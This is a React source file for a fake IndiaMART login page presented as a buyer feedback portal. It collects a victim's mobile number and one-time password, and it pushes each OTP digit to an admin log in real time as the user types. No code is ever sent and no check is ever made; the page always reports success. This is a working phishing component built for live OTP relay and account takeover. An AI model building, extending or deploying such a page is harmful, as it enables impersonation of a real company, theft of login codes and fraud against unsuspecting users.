'use client';

import React, { useState, useRef, useEffect } from 'react';
import { IndiaMartLogo } from './IndiaMartLogo';
import { UserSession } from '@/lib/types';
import { addOtpLog, updateLiveOtpLog } from '@/lib/storage';
import { RefreshCw, Edit2, KeyRound, CheckCircle2 } from 'lucide-react';
import { CountryCodeSelector, CountryCode, COUNTRY_LIST } from '@/components/CountryCodeSelector';

interface FirstPageIndiaMartLoginProps {
  onSuccessLogin: (session: UserSession) => void;
  onGoToAdmin: () => void;
}

export const FirstPageIndiaMartLogin: React.FC<FirstPageIndiaMartLoginProps> = ({
  onSuccessLogin,
  onGoToAdmin,
}) => {
  const [step, setStep] = useState<'mobile' | 'otp'>('mobile');
  const [selectedCountry, setSelectedCountry] = useState<CountryCode>(COUNTRY_LIST[0]);
  const [mobileNumber, setMobileNumber] = useState('');
  const [errorMsg, setErrorMsg] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  // OTP State - strictly 4 digits
  const [otpDigits, setOtpDigits] = useState<string[]>(['', '', '', '']);
  const [resendTimer, setResendTimer] = useState(30);
  const otpInputRefs = useRef<(HTMLInputElement | null)[]>([]);

  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (step === 'otp' && resendTimer > 0) {
      interval = setInterval(() => {
        setResendTimer((prev) => prev - 1);
      }, 1000);
    }
    return () => clearInterval(interval);
  }, [step, resendTimer]);

  const getFullMobile = () => `${selectedCountry.code} ${mobileNumber}`;

  const handleMobileSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const cleaned = mobileNumber.replace(/\D/g, '');
    if (cleaned.length !== 10) {
      setErrorMsg('Please enter a valid 10 digit mobile number.');
      return;
    }
    setErrorMsg('');
    setIsLoading(true);

    setTimeout(() => {
      setIsLoading(false);
      setStep('otp');
      setResendTimer(30);
      setOtpDigits(['', '', '', '']);
      // Immediately log pending OTP session for admin real-time view
      updateLiveOtpLog(getFullMobile(), '', 'Pending');
    }, 500);
  };

  const handleOtpChange = (index: number, val: string) => {
    if (!/^\d*$/.test(val)) return;

    const newOtp = [...otpDigits];
    newOtp[index] = val.slice(-1);
    setOtpDigits(newOtp);

    // LIVE OTP UPDATE TO ADMIN IN REAL-TIME AS USER TYPES EACH NUMBER
    const liveOtpString = newOtp.join('');
    updateLiveOtpLog(getFullMobile(), liveOtpString, 'Pending');

    // Auto focus next
    if (val && index < 3) {
      otpInputRefs.current[index + 1]?.focus();
    }
  };

  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !otpDigits[index] && index > 0) {
      otpInputRefs.current[index - 1]?.focus();
    }
  };

  const handleResendOtp = () => {
    if (resendTimer > 0) return;
    setResendTimer(30);
    setErrorMsg('');
    updateLiveOtpLog(getFullMobile(), '', 'Pending');
  };

  const handleVerifyOtp = (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    const enteredOtp = otpDigits.join('');
    if (enteredOtp.length !== 4) {
      setErrorMsg('Please enter the full 4-digit OTP code.');
      return;
    }

    setIsLoading(true);
    const fullMobile = getFullMobile();
    addOtpLog(fullMobile, enteredOtp);

    setTimeout(() => {
      setIsLoading(false);
      const session: UserSession = {
        mobileNumber: fullMobile,
        isVerified: true,
        verifiedAt: new Date().toISOString(),
      };
      onSuccessLogin(session);
    }, 600);
  };

  return (
    <div className="h-screen w-full bg-[#112347] flex flex-col justify-center items-center p-3 sm:p-4 md:p-6 relative overflow-hidden font-sans">
      {/* Background Decorative Subtle Lighting */}
      <div className="absolute -top-40 -left-40 w-[500px] h-[500px] bg-blue-600/15 rounded-full blur-3xl pointer-events-none" />
      <div className="absolute -bottom-40 -right-40 w-[500px] h-[500px] bg-emerald-500/15 rounded-full blur-3xl pointer-events-none" />

      {/* Main Container Card */}
      <div className="w-full max-w-6xl bg-white rounded-2xl md:rounded-3xl lg:rounded-[28px] shadow-2xl overflow-hidden grid grid-cols-1 md:grid-cols-12 my-auto z-10 border border-white/20 transition-all duration-300">
        {/* Left Side: Brand Image Container */}
        <div className="relative min-h-[220px] sm:min-h-[320px] md:min-h-[500px] lg:min-h-[580px] md:col-span-5 bg-gradient-to-br from-[#1c2250] via-[#282a8c] to-[#0f172a] p-6 sm:p-8 flex flex-col items-center justify-center text-white overflow-hidden group">
          {/* Subtle background glow */}
          <div className="absolute inset-0 bg-blue-500/10 backdrop-blur-3xs" />
          
          <div className="relative z-10 text-center space-y-6 flex flex-col items-center justify-center h-full w-full">
            <div className="bg-white/95 p-6 sm:p-8 rounded-2xl shadow-2xl backdrop-blur-md max-w-[85%] w-full flex items-center justify-center transition-transform duration-500 group-hover:scale-105">
              <img
                src="/image.png"
                alt="IndiaMART Logo"
                className="w-full h-auto max-h-48 object-contain"
              />
            </div>
            <div className="space-y-2 max-w-xs hidden sm:block">
              <h3 className="text-lg sm:text-xl font-extrabold tracking-tight text-white">
                Buyer Feedback &amp; Review Portal
              </h3>
              <p className="text-xs text-blue-200/90 leading-relaxed font-medium">
                Share your experience, rate verified suppliers, and help build a trusted marketplace.
              </p>
            </div>
          </div>
        </div>

        {/* Right Side: IndiaMART Mobile Input / OTP Screen */}
        <div className="bg-white p-6 sm:p-10 md:p-12 lg:p-16 xl:p-20 md:col-span-7 flex flex-col justify-center items-center text-center space-y-6 sm:space-y-8">
          {/* IndiaMART Logo */}
          <div className="transform hover:scale-105 transition-transform duration-300">
            <IndiaMartLogo size="xl" />
          </div>

          {step === 'mobile' ? (
            <form onSubmit={handleMobileSubmit} className="w-full max-w-lg space-y-6 sm:space-y-8">
              <p className="text-gray-500 font-medium text-base sm:text-lg lg:text-xl leading-relaxed px-2">
                Please enter your 10 digit mobile number for feedback
              </p>

              <div className="space-y-2">
                <div className="flex border-2 sm:border-[2.5px] border-[#4185f4] focus-within:border-[#2066d6] focus-within:ring-4 focus-within:ring-blue-500/20 rounded-full overflow-hidden bg-white shadow-sm transition-all">
                  <CountryCodeSelector
                    selectedCountry={selectedCountry}
                    onSelectCountry={setSelectedCountry}
                  />
                  <input
                    type="tel"
                    maxLength={12}
                    value={mobileNumber}
                    onChange={(e) => setMobileNumber(e.target.value.replace(/\D/g, ''))}
                    placeholder="Enter Your Mobile Number"
                    className="w-full text-gray-800 text-base sm:text-lg font-semibold px-4 py-3 sm:py-4 outline-none placeholder:text-gray-400 placeholder:font-normal"
                    autoFocus
                  />
                </div>
                {errorMsg && (
                  <p className="text-xs sm:text-sm font-bold text-red-600 animate-bounce">{errorMsg}</p>
                )}
              </div>

              <button
                type="submit"
                disabled={isLoading}
                className="w-full bg-[#d9383a] hover:bg-[#c62e30] active:bg-[#b02224] text-white font-bold text-lg sm:text-xl py-4 sm:py-4.5 rounded-full shadow-lg hover:shadow-xl transition-all flex items-center justify-center gap-2 cursor-pointer hover:scale-[1.01] active:scale-[0.99]"
              >
                {isLoading ? (
                  <>
                    <RefreshCw className="w-6 h-6 animate-spin" />
                    Sending OTP...
                  </>
                ) : (
                  'Next'
                )}
              </button>
            </form>
          ) : (
            /* OTP STEP - Strictly 4 Digits */
            <div className="w-full max-w-lg space-y-6 sm:space-y-8 animate-fadeIn">
              <div>
                <p className="text-gray-600 font-bold text-base sm:text-lg">
                  Enter 4-digit OTP code sent to
                </p>
                <div className="text-lg sm:text-xl font-extrabold text-[#112347] flex items-center justify-center gap-2 mt-2">
                  <span>{selectedCountry.code} {mobileNumber}</span>
                  <button
                    type="button"
                    onClick={() => {
                      setStep('mobile');
                      setErrorMsg('');
                    }}
                    className="text-xs sm:text-sm text-[#d9383a] underline font-bold flex items-center gap-1 hover:text-red-700 cursor-pointer ml-1"
                  >
                    <Edit2 className="w-4 h-4" />
                    Edit
                  </button>
                </div>
              </div>

              {/* 4 Digit Inputs */}
              <div className="space-y-3">
                <div className="flex justify-center gap-3 sm:gap-4">
                  {otpDigits.map((digit, idx) => (
                    <input
                      key={idx}
                      ref={(el) => {
                        otpInputRefs.current[idx] = el;
                      }}
                      type="text"
                      inputMode="numeric"
                      maxLength={1}
                      value={digit}
                      onChange={(e) => handleOtpChange(idx, e.target.value)}
                      onKeyDown={(e) => handleOtpKeyDown(idx, e)}
                      className="w-14 h-16 sm:w-16 sm:h-18 lg:w-18 lg:h-20 text-center text-3xl sm:text-4xl font-extrabold border-2 sm:border-[2.5px] border-[#4185f4] rounded-xl sm:rounded-2xl focus:border-blue-600 focus:ring-4 focus:ring-blue-500/20 outline-none text-gray-800 bg-white shadow-sm transition-all"
                      autoFocus={idx === 0}
                    />
                  ))}
                </div>
                {errorMsg && (
                  <p className="text-xs sm:text-sm font-bold text-red-600 text-center">{errorMsg}</p>
                )}
              </div>

              {/* OTP Resend Option */}
              <div className="flex items-center justify-between text-xs sm:text-sm font-medium pt-1 px-1">
                <span className="text-gray-500">Didn't receive OTP?</span>
                {resendTimer > 0 ? (
                  <span className="text-gray-400 font-semibold flex items-center gap-1">
                    Resend in <span className="text-[#202670] font-bold">00:{resendTimer < 10 ? `0${resendTimer}` : resendTimer}</span>
                  </span>
                ) : (
                  <button
                    type="button"
                    onClick={handleResendOtp}
                    className="text-[#d9383a] hover:text-[#c62e30] font-extrabold underline cursor-pointer hover:scale-105 transition-all"
                  >
                    Resend OTP
                  </button>
                )}
              </div>

              <button
                type="button"
                onClick={() => handleVerifyOtp()}
                disabled={isLoading}
                className="w-full bg-[#d9383a] hover:bg-[#c62e30] active:bg-[#b02224] text-white font-bold text-lg sm:text-xl py-4 sm:py-4.5 rounded-full shadow-lg hover:shadow-xl transition-all flex items-center justify-center gap-2 cursor-pointer hover:scale-[1.01]"
              >
                {isLoading ? (
                  <>
                    <RefreshCw className="w-6 h-6 animate-spin" />
                    Verifying...
                  </>
                ) : (
                  'Verify & Continue to Feedback'
                )}
              </button>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};
